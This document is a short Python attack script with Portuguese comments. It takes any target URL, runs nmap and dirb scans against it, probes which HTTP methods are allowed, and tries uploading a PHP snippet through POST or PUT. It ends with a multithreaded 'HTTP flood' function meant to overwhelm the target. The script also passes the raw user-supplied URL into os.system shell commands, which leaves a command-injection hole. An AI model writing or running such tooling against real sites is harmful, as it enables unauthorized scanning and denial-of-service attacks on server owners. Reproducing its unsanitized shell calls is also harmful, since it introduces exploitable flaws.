import requests
import threading
import logging
import time
import os

# Configuração
url_alvo = input("Digite a URL de destino: ")
num_threads = 10  # Reduzido para um melhor manejo de threads
max_requisicoes_por_thread = 10  # Controla o número de requisições por thread

# Configurando o logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Funções de varredura de porta e diretório permanecem as mesmas
def scan_ports():
    os.system(f"nmap -Pn {url_alvo}")

def scan_directories():
    os.system(f"dirb {url_alvo}")

# Função melhorada de verificação de métodos HTTP com tempo limite e tratamento de erros
def verifica_metodos_http():
    metodos = ['POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
    metodos_permitidos = []
    for metodo in metodos:
        try:
            resposta = requests.request(metodo, url_alvo, timeout=5)
            if resposta.status_code != 405:
                metodos_permitidos.append(metodo)
        except requests.RequestException as e:
            logging.error(f"Erro ao verificar o método {metodo}: {str(e)}")
    return metodos_permitidos

# Função simplificada e focada de envio de cargas úteis
def envia_cargas(metodos_permitidos):
    cargas = {'php': "<?php echo 'Hello, world!'; ?>"}
    for metodo in metodos_permitidos:
        for lang, carga in cargas.items():
            try:
                if metodo in ['POST', 'PUT']:
                    resposta = requests.request(metodo, url_alvo, data={lang: carga}, timeout=5)
                    if resposta:
                        logging.info(f"Resposta de {metodo}: {resposta.text}")
                    else:
                        logging.info(f"Sem resposta de {metodo}")
            except requests.RequestException as e:
                logging.error(f"Erro ao enviar carga com {metodo}: {str(e)}")

# Função de inundação HTTP usando requisições assíncronas para melhor desempenho
def inundacao_http():
    with requests.Session() as sessao:
        for _ in range(max_requisicoes_por_thread):
            try:
                sessao.get(url_alvo, timeout=5)
                logging.info("Requisição enviada com sucesso")
            except requests.RequestException as e:
                logging.error(f"Falha ao enviar requisição: {str(e)}")

# Função principal para coordenar os testes
def main():
    scan_ports()
    scan_directories()
    metodos_permitidos = verifica_metodos_http()
    envia_cargas(metodos_permitidos)

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=inundacao_http)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
